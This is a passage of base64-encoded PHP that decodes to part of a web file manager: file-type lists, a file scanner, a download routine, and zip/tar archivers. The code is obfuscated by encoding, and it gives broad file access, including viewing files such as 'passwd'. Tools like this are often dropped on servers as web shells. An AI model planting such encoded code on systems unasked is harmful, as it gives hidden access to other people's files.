CAgICAgICBjYXNlICdzd2YnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtaW1hZ2Utbyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ2V4ZSc6CiAgICAgICAgY2FzZSAnbXNpJzoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLW8nOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdiYXQnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLXRlcm1pbmFsJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1pbmZvLWNpcmNsZSc7CiAgICB9CgogICAgcmV0dXJuICRpbWc7Cn0KCi8qKgogKiBHZXQgaW1hZ2UgZmlsZXMgZXh0ZW5zaW9ucwogKiBAcmV0dXJuIGFycmF5CiAqLwpmdW5jdGlvbiBmbV9nZXRfaW1hZ2VfZXh0cygpCnsKICAgIHJldHVybiBhcnJheSgnaWNvJywgJ2dpZicsICdqcGcnLCAnanBlZycsICdqcGMnLCAnanAyJywgJ2pweCcsICd4Ym0nLCAnd2JtcCcsICdwbmcnLCAnYm1wJywgJ3RpZicsICd0aWZmJywgJ3BzZCcsICdzdmcnKTsKfQoKLyoqCiAqIEdldCB2aWRlbyBmaWxlcyBleHRlbnNpb25zCiAqIEByZXR1cm4gYXJyYXkKICovCmZ1bmN0aW9uIGZtX2dldF92aWRlb19leHRzKCkKewogICAgcmV0dXJuIGFycmF5KCdhdmknLCAnd2VibScsICd3bXYnLCAnbXA0JywgJ200dicsICdvZ20nLCAnb2d2JywgJ21vdicsICdta3YnKTsKfQoKLyoqCiAqIEdldCBhdWRpbyBmaWxlcyBleHRlbnNpb25zCiAqIEByZXR1cm4gYXJyYXkKICovCmZ1bmN0aW9uIGZtX2dldF9hdWRpb19leHRzKCkKewogICAgcmV0dXJuIGFycmF5KCd3YXYnLCAnbXAzJywgJ29nZycsICdtNGEnKTsKfQoKLyoqCiAqIEdldCB0ZXh0IGZpbGUgZXh0ZW5zaW9ucwogKiBAcmV0dXJuIGFycmF5CiAqLwpmdW5jdGlvbiBmbV9nZXRfdGV4dF9leHRzKCkKewogICAgcmV0dXJuIGFycmF5KAogICAgICAgICd0eHQnLCAnY3NzJywgJ2luaScsICdjb25mJywgJ2xvZycsICdodGFjY2VzcycsICdwYXNzd2QnLCAnZnRwcXVvdGEnLCAnc3FsJywgJ2pzJywgJ2pzb24nLCAnc2gnLCAnY29uZmlnJywKICAgICAgICAncGhwJywgJ3BocDQnLCAncGhwNScsICdwaHBzJywgJ3BodG1sJywgJ2h0bScsICdodG1sJywgJ3NodG1sJywgJ3hodG1sJywgJ3htbCcsICd4c2wnLCAnbTN1JywgJ20zdTgnLCAncGxzJywgJ2N1ZScsCiAgICAgICAgJ2VtbCcsICdtc2cnLCAnY3N2JywgJ2JhdCcsICd0d2lnJywgJ3RwbCcsICdtZCcsICdnaXRpZ25vcmUnLCAnbGVzcycsICdzYXNzJywgJ3Njc3MnLCAnYycsICdjcHAnLCAnY3MnLCAncHknLAogICAgICAgICdtYXAnLCAnbG9jaycsICdkdGQnLCAnc3ZnJywgJ3Njc3MnLCAnYXNwJywgJ2FzcHgnLCAnYXN4JywgJ2FzbXgnLCAnYXNoeCcsICdqc3gnLCAnanNwJywgJ2pzcHgnLCAnY2ZtJywgJ2NnaScKICAgICk7Cn0KCi8qKgogKiBHZXQgbWltZSB0eXBlcyBvZiB0ZXh0IGZpbGVzCiAqIEByZXR1cm4gYXJyYXkKICovCmZ1bmN0aW9uIGZtX2dldF90ZXh0X21pbWVzKCkKewogICAgcmV0dXJuIGFycmF5KAogICAgICAgICdhcHBsaWNhdGlvbi94bWwnLAogICAgICAgICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JywKICAgICAgICAnYXBwbGljYXRpb24veC1qYXZhc2NyaXB0JywKICAgICAgICAnaW1hZ2Uvc3ZnK3htbCcsCiAgICAgICAgJ21lc3NhZ2UvcmZjODIyJywKICAgICk7Cn0KCi8qKgogKiBHZXQgZmlsZSBuYW1lcyBvZiB0ZXh0IGZpbGVzIHcvbyBleHRlbnNpb25zCiAqIEByZXR1cm4gYXJyYXkKICovCmZ1bmN0aW9uIGZtX2dldF90ZXh0X25hbWVzKCkKewogICAgcmV0dXJuIGFycmF5KAogICAgICAgICdsaWNlbnNlJywKICAgICAgICAncmVhZG1lJywKICAgICAgICAnYXV0aG9ycycsCiAgICAgICAgJ2NvbnRyaWJ1dG9ycycsCiAgICAgICAgJ2NoYW5nZWxvZycsCiAgICApOwp9CgovKioKICogR2V0IG9ubGluZSBkb2NzIHZpZXdlciBzdXBwb3J0ZWQgZmlsZXMgZXh0ZW5zaW9ucwogKiBAcmV0dXJuIGFycmF5CiAqLwpmdW5jdGlvbiBmbV9nZXRfb25saW5lVmlld2VyX2V4dHMoKQp7CiAgICByZXR1cm4gYXJyYXkoJ2RvYycsICdkb2N4JywgJ3hscycsICd4bHN4JywgJ3BkZicsICdwcHQnLCAncHB0eCcsICdhaScsICdwc2QnLCAnZHhmJywgJ3hwcycsICdyYXInLCAnb2R0JywgJ29kcycpOwp9CgpmdW5jdGlvbiBmbV9nZXRfZmlsZV9taW1lcygkZXh0ZW5zaW9uKQp7CiAgICAkZmlsZVR5cGVzWydzd2YnXSA9ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCc7CiAgICAkZmlsZVR5cGVzWydwZGYnXSA9ICdhcHBsaWNhdGlvbi9wZGYnOwogICAgJGZpbGVUeXBlc1snZXhlJ10gPSAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJzsKICAgICRmaWxlVHlwZXNbJ3ppcCddID0gJ2FwcGxpY2F0aW9uL3ppcCc7CiAgICAkZmlsZVR5cGVzWydkb2MnXSA9ICdhcHBsaWNhdGlvbi9tc3dvcmQnOwogICAgJGZpbGVUeXBlc1sneGxzJ10gPSAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJzsKICAgICRmaWxlVHlwZXNbJ3BwdCddID0gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JzsKICAgICRmaWxlVHlwZXNbJ2dpZiddID0gJ2ltYWdlL2dpZic7CiAgICAkZmlsZVR5cGVzWydwbmcnXSA9ICdpbWFnZS9wbmcnOwogICAgJGZpbGVUeXBlc1snanBlZyddID0gJ2ltYWdlL2pwZyc7CiAgICAkZmlsZVR5cGVzWydqcGcnXSA9ICdpbWFnZS9qcGcnOwogICAgJGZpbGVUeXBlc1sncmFyJ10gPSAnYXBwbGljYXRpb24vcmFyJzsKCiAgICAkZmlsZVR5cGVzWydyYSddID0gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJzsKICAgICRmaWxlVHlwZXNbJ3JhbSddID0gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJzsKICAgICRmaWxlVHlwZXNbJ29nZyddID0gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJzsKCiAgICAkZmlsZVR5cGVzWyd3YXYnXSA9ICd2aWRlby94LW1zdmlkZW8nOwogICAgJGZpbGVUeXBlc1snd212J10gPSAndmlkZW8veC1tc3ZpZGVvJzsKICAgICRmaWxlVHlwZXNbJ2F2aSddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7CiAgICAkZmlsZVR5cGVzWydhc2YnXSA9ICd2aWRlby94LW1zdmlkZW8nOwogICAgJGZpbGVUeXBlc1snZGl2eCddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7CgogICAgJGZpbGVUeXBlc1snbXAzJ10gPSAnYXVkaW8vbXBlZyc7CiAgICAkZmlsZVR5cGVzWydtcDQnXSA9ICdhdWRpby9tcGVnJzsKICAgICRmaWxlVHlwZXNbJ21wZWcnXSA9ICd2aWRlby9tcGVnJzsKICAgICRmaWxlVHlwZXNbJ21wZyddID0gJ3ZpZGVvL21wZWcnOwogICAgJGZpbGVUeXBlc1snbXBlJ10gPSAndmlkZW8vbXBlZyc7CiAgICAkZmlsZVR5cGVzWydtb3YnXSA9ICd2aWRlby9xdWlja3RpbWUnOwogICAgJGZpbGVUeXBlc1snc3dmJ10gPSAndmlkZW8vcXVpY2t0aW1lJzsKICAgICRmaWxlVHlwZXNbJzNncCddID0gJ3ZpZGVvL3F1aWNrdGltZSc7CiAgICAkZmlsZVR5cGVzWydtNGEnXSA9ICd2aWRlby9xdWlja3RpbWUnOwogICAgJGZpbGVUeXBlc1snYWFjJ10gPSAndmlkZW8vcXVpY2t0aW1lJzsKICAgICRmaWxlVHlwZXNbJ20zdSddID0gJ3ZpZGVvL3F1aWNrdGltZSc7CgogICAgJGZpbGVUeXBlc1sncGhwJ10gPSBbJ2FwcGxpY2F0aW9uL3gtcGhwJ107CiAgICAkZmlsZVR5cGVzWydodG1sJ10gPSBbJ3RleHQvaHRtbCddOwogICAgJGZpbGVUeXBlc1sndHh0J10gPSBbJ3RleHQvcGxhaW4nXTsKICAgIHJldHVybiAkZmlsZVR5cGVzWyRleHRlbnNpb25dOwp9CgovKioKICogVGhpcyBmdW5jdGlvbiBzY2FucyB0aGUgZmlsZXMgYW5kIGZvbGRlciByZWN1cnNpdmVseSwgYW5kIHJldHVybiBtYXRjaGluZyBmaWxlcwogKiBAcGFyYW0gc3RyaW5nICRkaXIKICogQHBhcmFtIHN0cmluZyAkZmlsdGVyCiAqIEByZXR1cm4ganNvbgogKi8KIGZ1bmN0aW9uIHNjYW4oJGRpciwgJGZpbHRlciA9ICcnKSB7CiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSC4nLycuJGRpcjsKICAgICBpZigkZGlyKSB7CiAgICAgICAgICRpdGUgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcihuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJHBhdGgpKTsKICAgICAgICAgJHJpaSA9IG5ldyBSZWdleEl0ZXJhdG9yKCRpdGUsICIvKCIgLiAkZmlsdGVyIC4gIikvaSIpOwoKICAgICAgICAgJGZpbGVzID0gYXJyYXkoKTsKICAgICAgICAgZm9yZWFjaCAoJHJpaSBhcyAkZmlsZSkgewogICAgICAgICAgICAgaWYgKCEkZmlsZS0+aXNEaXIoKSkgewogICAgICAgICAgICAgICAgICRmaWxlTmFtZSA9ICRmaWxlLT5nZXRGaWxlbmFtZSgpOwogICAgICAgICAgICAgICAgICRsb2NhdGlvbiA9IHN0cl9yZXBsYWNlKEZNX1JPT1RfUEFUSCwgJycsICRmaWxlLT5nZXRQYXRoKCkpOwogICAgICAgICAgICAgICAgICRmaWxlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICJuYW1lIiA9PiAkZmlsZU5hbWUsCiAgICAgICAgICAgICAgICAgICAgICJ0eXBlIiA9PiAiZmlsZSIsCiAgICAgICAgICAgICAgICAgICAgICJwYXRoIiA9PiAkbG9jYXRpb24sCiAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgIH0KICAgICAgICAgfQogICAgICAgICByZXR1cm4gJGZpbGVzOwogICAgIH0KfQoKLyoKUGFyYW1ldGVyczogZG93bmxvYWRGaWxlKEZpbGUgTG9jYXRpb24sIEZpbGUgTmFtZSwKbWF4IHNwZWVkLCBpcyBzdHJlYW1pbmcKSWYgc3RyZWFtaW5nIC0gdmlkZW9zIHdpbGwgc2hvdyBhcyB2aWRlb3MsIGltYWdlcyBhcyBpbWFnZXMKaW5zdGVhZCBvZiBkb3dubG9hZCBwcm9tcHQKaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9hLzEzODIxOTkyLzExNjQ2NDIKKi8KCmZ1bmN0aW9uIGZtX2Rvd25sb2FkX2ZpbGUoJGZpbGVMb2NhdGlvbiwgJGZpbGVOYW1lLCAkY2h1bmtTaXplICA9IDEwMjQpCnsKICAgIGlmIChjb25uZWN0aW9uX3N0YXR1cygpICE9IDApCiAgICAgICAgcmV0dXJuIChmYWxzZSk7CiAgICAkZXh0ZW5zaW9uID0gcGF0aGluZm8oJGZpbGVOYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOwoKICAgICRjb250ZW50VHlwZSA9IGZtX2dldF9maWxlX21pbWVzKCRleHRlbnNpb24pOwogICAgaGVhZGVyKCJDYWNoZS1Db250cm9sOiBwdWJsaWMiKTsKICAgIGhlYWRlcigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5XG4iKTsKICAgIGhlYWRlcignQ29udGVudC1UeXBlOiAkY29udGVudFR5cGUnKTsKCiAgICAkY29udGVudERpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnOwoKCiAgICBpZiAoc3Ryc3RyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSwgIk1TSUUiKSkgewogICAgICAgICRmaWxlTmFtZSA9IHByZWdfcmVwbGFjZSgnL1wuLycsICclMmUnLCAkZmlsZU5hbWUsIHN1YnN0cl9jb3VudCgkZmlsZU5hbWUsICcuJykgLSAxKTsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246ICRjb250ZW50RGlzcG9zaXRpb247ZmlsZW5hbWU9XCIkZmlsZU5hbWVcIiIpOwogICAgfSBlbHNlIHsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246ICRjb250ZW50RGlzcG9zaXRpb247ZmlsZW5hbWU9XCIkZmlsZU5hbWVcIiIpOwogICAgfQoKICAgIGhlYWRlcigiQWNjZXB0LVJhbmdlczogYnl0ZXMiKTsKICAgICRyYW5nZSA9IDA7CiAgICAkc2l6ZSA9IGZpbGVzaXplKCRmaWxlTG9jYXRpb24pOwoKICAgIGlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9SQU5HRSddKSkgewogICAgICAgIGxpc3QoJGEsICRyYW5nZSkgPSBleHBsb2RlKCI9IiwgJF9TRVJWRVJbJ0hUVFBfUkFOR0UnXSk7CiAgICAgICAgc3RyX3JlcGxhY2UoJHJhbmdlLCAiLSIsICRyYW5nZSk7CiAgICAgICAgJHNpemUyID0gJHNpemUgLSAxOwogICAgICAgICRuZXdfbGVuZ3RoID0gJHNpemUgLSAkcmFuZ2U7CiAgICAgICAgaGVhZGVyKCJIVFRQLzEuMSAyMDYgUGFydGlhbCBDb250ZW50Iik7CiAgICAgICAgaGVhZGVyKCJDb250ZW50LUxlbmd0aDogJG5ld19sZW5ndGgiKTsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtUmFuZ2U6IGJ5dGVzICRyYW5nZSRzaXplMi8kc2l6ZSIpOwogICAgfSBlbHNlIHsKICAgICAgICAkc2l6ZTIgPSAkc2l6ZSAtIDE7CiAgICAgICAgaGVhZGVyKCJDb250ZW50LVJhbmdlOiBieXRlcyAwLSRzaXplMi8kc2l6ZSIpOwogICAgICAgIGhlYWRlcigiQ29udGVudC1MZW5ndGg6ICIgLiAkc2l6ZSk7CiAgICB9CgogICAgaWYgKCRzaXplID09IDApIHsKICAgICAgICBkaWUoJ1plcm8gYnl0ZSBmaWxlISBBYm9ydGluZyBkb3dubG9hZCcpOwogICAgfQogICAgQGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgMCk7CiAgICAkZnAgPSBmb3BlbigiJGZpbGVMb2NhdGlvbiIsICJyYiIpOwoKICAgIGZzZWVrKCRmcCwgJHJhbmdlKTsKCiAgICB3aGlsZSAoIWZlb2YoJGZwKSBhbmQgKGNvbm5lY3Rpb25fc3RhdHVzKCkgPT0gMCkpIHsKICAgICAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgICAgICBwcmludChAZnJlYWQoJGZwLCAxMDI0KiRjaHVua1NpemUpKTsKICAgICAgICBmbHVzaCgpOwogICAgICAgIG9iX2ZsdXNoKCk7CiAgICAgICAgc2xlZXAoMSk7CiAgICB9CiAgICBmY2xvc2UoJGZwKTsKCiAgICByZXR1cm4gKChjb25uZWN0aW9uX3N0YXR1cygpID09IDApIGFuZCAhY29ubmVjdGlvbl9hYm9ydGVkKCkpOwp9CgpmdW5jdGlvbiBmbV9nZXRfdGhlbWUoKSB7CiAgICAkcmVzdWx0ID0gJyc7CiAgICBpZihGTV9USEVNRSA9PSAiZGFyayIpIHsKICAgICAgICAkcmVzdWx0ID0gInRleHQtd2hpdGUgYmctZGFyayI7CiAgICB9CiAgICByZXR1cm4gJHJlc3VsdDsKfQoKLyoqCiAqIENsYXNzIHRvIHdvcmsgd2l0aCB6aXAgZmlsZXMgKHVzaW5nIFppcEFyY2hpdmUpCiAqLwpjbGFzcyBGTV9aaXBwZXIKewogICAgcHJpdmF0ZSAkemlwOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICB7CiAgICAgICAgJHRoaXMtPnppcCA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYXJjaGl2ZSB3aXRoIG5hbWUgJGZpbGVuYW1lIGFuZCBmaWxlcyAkZmlsZXMgKFJFTEFUSVZFIFBBVEhTISkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lCiAgICAgKiBAcGFyYW0gYXJyYXl8c3RyaW5nICRmaWxlcwogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGUoJGZpbGVuYW1lLCAkZmlsZXMpCiAgICB7CiAgICAgICAgJHJlcyA9ICR0aGlzLT56aXAtPm9wZW4oJGZpbGVuYW1lLCBaaXBBcmNoaXZlOjpDUkVBVEUpOwogICAgICAgIGlmICgkcmVzICE9PSB0cnVlKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX2FycmF5KCRmaWxlcykpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5hZGRGaWxlT3JEaXIoJGYpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnppcC0+Y2xvc2UoKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRoaXMtPnppcC0+Y2xvc2UoKTsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPnppcC0+Y2xvc2UoKTsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBFeHRyYWN0IGFyY2hpdmUgJGZpbGVuYW1lIHRvIGZvbGRlciAkcGF0aCAoUkVMQVRJVkUgT1IgQUJTT0xVVEUgUEFUSFMpCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aAogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB1bnppcCgkZmlsZW5hbWUsICRwYXRoKQogICAgewogICAgICAgICRyZXMgPSAkdGhpcy0+emlwLT5vcGVuKCRmaWxlbmFtZSk7CiAgICAgICAgaWYgKCRyZXMgIT09IHRydWUpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPnppcC0+ZXh0cmFjdFRvKCRwYXRoKSkgewogICAgICAgICAgICAkdGhpcy0+emlwLT5jbG9zZSgpOwogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGZpbGUvZm9sZGVyIHRvIGFyY2hpdmUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBhZGRGaWxlT3JEaXIoJGZpbGVuYW1lKQogICAgewogICAgICAgIGlmIChpc19maWxlKCRmaWxlbmFtZSkpIHsKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT56aXAtPmFkZEZpbGUoJGZpbGVuYW1lKTsKICAgICAgICB9IGVsc2VpZiAoaXNfZGlyKCRmaWxlbmFtZSkpIHsKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5hZGREaXIoJGZpbGVuYW1lKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGZvbGRlciByZWN1cnNpdmVseQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aAogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHByaXZhdGUgZnVuY3Rpb24gYWRkRGlyKCRwYXRoKQogICAgewogICAgICAgIGlmICghJHRoaXMtPnppcC0+YWRkRW1wdHlEaXIoJHBhdGgpKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsKICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZERpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+emlwLT5hZGRGaWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKLyoqCiAqIENsYXNzIHRvIHdvcmsgd2l0aCBUYXIgZmlsZXMgKHVzaW5nIFBoYXJEYXRhKQogKi8KY2xhc3MgRk1fWmlwcGVyX1Rhcgp7CiAgICBwcml2YXRlICR0YXI7CgogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCkKICAgIHsKICAgICAgICAkdGhpcy0+dGFyID0gbnVsbDsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSBhcmNoaXZlIHdpdGggbmFtZSAkZmlsZW5hbWUgYW5kIGZpbGVzICRmaWxlcyAoUkVMQVRJVkUgUEFUSFMhKQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUKICAgICAqIEBwYXJhbSBhcnJheXxzdHJpbmcgJGZpbGVzCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZSgkZmlsZW5hbWUsICRmaWxlcykKICAgIHsKICAgICAgICAkdGhpcy0+dGFyID0gbmV3IFBoYXJEYXRhKCRmaWxlbmFtZSk7CiAgICAgICAgaWYgKGlzX2FycmF5KCRmaWxlcykpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5hZGRGaWxlT3JEaXIoJGYpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkRmlsZU9yRGlyKCRmaWxlcykpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBFeHRyYWN0IGFyY2hpdmUgJGZpbGVuYW1lIHRvIGZvbGRlciAkcGF0aCAoUkVMQVRJVkUgT1IgQUJTT0xVVEUgUEFUSFMpCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aAogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB1bnppcCgkZmlsZW5hbWUsICRwYXRoKQogICAgewogICAgICAgICRyZXMgPSAkdGhpcy0+dGFyLT5vcGVuKCRmaWxlbmFtZSk7CiAgICAgICAgaWYgKCRyZXMgIT09IHRydWUpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPnRhci0+ZXh0cmFjdFRvKCRwYXRoKSkgewogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGZpbGUvZm9sZGVyIHRvIGFyY2hpdmUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBhZGRGaWxlT3JEaXIoJGZpbGVuYW1lKQogICAgewogICAgICAgIGlmIChpc19maWxlKCRmaWxlbmFtZSkpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICR0aGlzLT50YXItPmFkZEZpbGUoJGZpbGVuYW1lKTsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmIChpc19kaXIoJGZpbGVuYW1lKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmFkZERpcigkZmlsZW5hbWUpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgZm9sZGVyIHJlY3Vyc2l2ZWx5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBhZGREaXIoJHBhdGgpCiAgICB7CiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsKICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZERpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT50YXItPmFkZEZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9Cn0KCgoKLyoqCiAqIFNhdmUgQ29uZmlndXJhdGlvbgogKi8KIGNsYXNzIEZNX0NvbmZpZwp7CiAgICAgdmFyICRkYXRhOwoKICAgIGZ1bmN0aW9uIF9fY29uc3RydWN0KCkKICAgIHsKICAgICAgICBnbG9iYWwgJHJvb3RfcGF0aCwgJHJvb3RfdXJsLCAkQ09ORklHOwogICAgICAgICRmbV91cmwgPSAkcm9vdF91cmwuJF9TRVJWRVJbIlBIUF9TRUxGIl07CiAgICAgICAgJHRoaXMtPmRhdGEgPSBhcnJheSgKICAgICAgICAgICAgJ2xhbmcnID0+ICdlb